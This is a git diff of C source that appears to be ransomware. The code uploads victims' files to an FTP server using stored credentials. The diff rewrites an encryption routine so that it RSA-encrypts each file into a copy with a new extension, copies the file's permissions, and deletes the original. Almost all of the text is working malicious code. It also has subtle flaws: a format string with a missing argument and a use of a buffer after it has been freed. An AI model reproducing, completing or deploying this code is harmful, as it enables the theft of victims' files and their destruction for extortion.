@@ -1,3 +1,6 @@
+#include <fcntl.h>
+#include <sys/mman.h>
+
 #include <curl/curl.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -5,18 +8,18 @@
 #include <sys/stat.h>
 #include <unistd.h>
 
-#include "../lib/enc.h"
 #include "../lib/log.h"
+#include "../lib/rsa.h"
 #include "../lib/util.h"
 
-char *FTP_URL = NULL;
+char *FTP_URL  = NULL;
 char *FTP_USER = NULL;
-char *FTP_PWD = NULL;
-char *EXT = NULL;
+char *FTP_PWD  = NULL;
+char *EXT      = NULL;
 
 void upload_file(void *arg) {
   char *file = (char *)arg;
-  FILE *fp = fopen(file, "r");
+  FILE *fp   = fopen(file, "r");
   if (NULL == fp) {
     free(file);
     return;
@@ -39,8 +42,7 @@ void upload_file(void *arg) {
   debug("Uploading to FTP(S): %s", url);
   curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
   curl_easy_setopt(curl, CURLOPT_USERPWD, userpwd);
-  curl_easy_setopt(curl, CURLOPT_FTP_CREATE_MISSING_DIRS,
-                   (long)CURLFTP_CREATE_DIR_RETRY);
+  curl_easy_setopt(curl, CURLOPT_FTP_CREATE_MISSING_DIRS, (long)CURLFTP_CREATE_DIR_RETRY);
   curl_easy_setopt(curl, CURLOPT_URL, url);
   curl_easy_setopt(curl, CURLOPT_READDATA, fp);
 
@@ -54,48 +56,80 @@ void upload_file(void *arg) {
 }
 
 void encrypt_file(void *arg) {
-  char *file = (char *)arg;
-  char new_file[strlen(file) + strlen(EXT) + 2];
-  sprintf(new_file, "%s.%s", file, EXT);
+  EVP_PKEY_CTX *ctx = NULL;
 
-  if(access(new_file, F_OK)==0)
-    return;
+  unsigned char in_buf[INPUT_SIZE];
+  unsigned char out_buf[OUTPUT_SIZE];
 
-  FILE *src = fopen(file, "r+b");
-  FILE *dst = fopen(new_file, "w+b");
+  size_t in_len  = 0;
+  size_t out_len = 0;
 
-  if (NULL == src || NULL == dst){
-    error("Failed to open %s", file);
+  bool success = false;
+
+  char *in_file = (char *)arg;
+  char  out_file[strlen(in_file) + strlen(EXT) + 2];
+
+  sprintf(out_file, "%s.%s", in_file, EXT);
+
+  FILE *in  = fopen(in_file, "r");
+  FILE *out = fopen(out_file, "a");
+
+  if (NULL == in || NULL == out) {
+    debug("(%s) Failed to open in/out", in_file);
     goto FREE;
   }
 
-  unsigned char output[64] = {0};
-  unsigned char input[64] = {0};
-  int readsz = 0;
+  ctx = rsa_encrypt_init();
+  if (NULL == ctx) {
+    debug("(%s) Failed to create ctx", in_file);
+    goto FREE;
+  }
 
-  while (true) {
-    readsz = fread(input, 1, 64, src);
-    if(readsz <= 0)
-      goto FREE;
-
-    if (encrypt(input, readsz, output) <= 0) {
-      error("Failed to encrypt %s", file);
+  while ((in_len = fread(in_buf, 1, INPUT_SIZE, in)) > 0) {
+    out_len = OUTPUT_SIZE;
+    if (!rsa_encrypt(ctx, in_buf, in_len, out_buf, &out_len)) {
+      debug("(%s) Failed to encrypt (%lu -> %lu)", in_file, in_len, out_len);
       goto FREE;
     }
 
-    fwrite(output, 1, readsz, dst);
-    if (readsz < 64)
+    if (fwrite(out_buf, 1, out_len, out) <= 0) {
+      debug("(%s) Failed to write output", in_file);
+      goto FREE;
+    }
+
+    if (in_len < INPUT_SIZE)
       break;
   }
 
   struct stat st;
-  fstat(fileno(src), &st);
-  fchown(fileno(dst), st.st_uid, st.st_gid);
-  fchmod(fileno(dst), st.st_mode);
-  unlink(file);
+  fstat(fileno(in), &st);
+
+  if (!copy_stat(fileno(in), fileno(out))) {
+    debug("(%s) Failed to copy perms", in_file);
+    goto FREE;
+  }
+
+  if (unlink(in_file) < 0) {
+    debug("(%s) Failed to unlink: %s", in_file);
+    goto FREE;
+  }
+
+  success = true;
 
 FREE:
-  fclose(dst);
-  fclose(src);
-  free(file);
+  if (NULL != ctx)
+    rsa_encrypt_free(ctx);
+
+  if (NULL != in)
+    fclose(in);
+
+  if (NULL != out)
+    fclose(out);
+
+  free(in_file);
+
+  if (!success) {
+    error("Failed to encrypt file: %s", in_file);
+    unlink(out_file);
+  }
 }
